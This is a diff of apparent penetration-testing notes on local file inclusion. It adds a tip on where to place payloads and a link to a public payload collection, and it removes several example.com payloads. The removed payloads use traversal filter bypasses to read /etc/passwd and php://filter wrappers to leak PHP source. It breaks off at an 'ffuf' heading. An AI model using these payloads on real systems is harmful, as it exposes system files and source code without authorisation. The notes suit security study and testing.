@@ -1,22 +1,10 @@
+!!! alert "note"
+	Try to exploit 1st by replacing the expected value, then by appending your payload after the expected value. If you see a path `/var/www/images/5.jpg` we may need to insert our payload not at the root, but instead of 5.jpg - the application may be expecting the preceding path to exist in the request. 
+
 
 **List of payloads**
-[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File) Inclusion/README.md
-**Non-recursive filter bypass**
-```Python
-http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd
-```
-**Mangle capitals & operators for filter bypasses**
-```Python
-http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd
-```
-**PHP Wrappers**
-- Leak php instead of executing it.
-```Python
-http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
-http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
-http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
-```
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
 **ffuf**
 - Copy request to file via burp
 ```Python
